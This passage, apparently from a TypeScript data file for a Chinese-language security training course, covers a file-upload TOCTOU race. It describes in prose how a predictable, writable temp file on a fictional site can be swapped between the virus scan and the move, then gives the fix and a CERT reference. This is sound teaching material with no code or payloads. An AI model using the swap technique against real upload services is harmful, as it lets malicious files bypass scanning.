      '场景（演示样例，站点 example.com 的头像上传）：\n服务端流程（演示样例，两步不原子）：\n  步骤 A：保存到 /tmp/avatar_123 → 扫毒检查内容\n  步骤 B：检查通过后，把 /tmp/avatar_123 移动到 /var/www/avatars/123.png\n\n攻击步骤（演示样例，两请求并发）：\n1. 请求 1：上传正常图片 → 服务端进入步骤 A（扫毒中）\n2. 请求 2：在「扫毒完成、尚未移动」的窗口内\n   ——同主机另一接口把 /tmp/avatar_123 替换为恶意内容\n   （临时名可预测、临时目录可写）\n3. 步骤 B 执行：移动的是替换后的文件\n   → 恶意内容绕过扫毒落到正式目录\n\n逻辑链自查：\n输入（窗口内替换临时文件）\n→ 机制（检查与使用分离、临时文件可预测可写，TOCTOU 时间窗）\n→ 结果（恶意内容绕过检查生效）✔ 每步成立',
    language: 'plaintext',
    note: '材料为演示样例，站点与流程为虚构、替换内容为无害标记，非现场运行、非真实系统。修法对照：私有目录 + 不可预测文件名（替换不到）+ 原子 rename 移入（检查基于同一文件句柄、检查后即定稿，窗口不存在）。',
    source: 'demo',
  },
  guide: {
    why: '盯「检查和使用之间隔了多久、隔的是不是同一个文件」。两步分离就有窗口，窗口内文件可被调包——检查的和用的，必须是同一次读取。临时文件的命名与权限决定「调包」难度。',
    how: '① 找「检查→使用」两步流程；② 看临时文件命名与权限；③ 并发构造窗口验证（授权环境）；④ 修复按「私有目录 + 不可预测文件名 + 原子 rename」三件套。',
  },
  guideDefaultOn: true,
  stages: [],
  templateId: 'TPL-CHAIN',
  source: 'demo',
  format: 'interactive',
  realCases: [
    { refId: 'RC-507', summary: 'TOCTOU 竞争条件防护规范（成因：检查-使用分离、临时文件可预测；教训：原子操作 + 安全临时文件 API）', lesson: '原子操作 + 安全临时文件 API', source: 'SEI/CERT TOCTOU 编码规范', credibility: '权威' },
  ],
};

export const ch5Entries: LearningEntry[] = [
  fileUpload,
  fileInclusion,
  arbitraryFileRead,
  zipSlip,
  fileParsing,
  toctouRace,
];

export default ch5Entries;
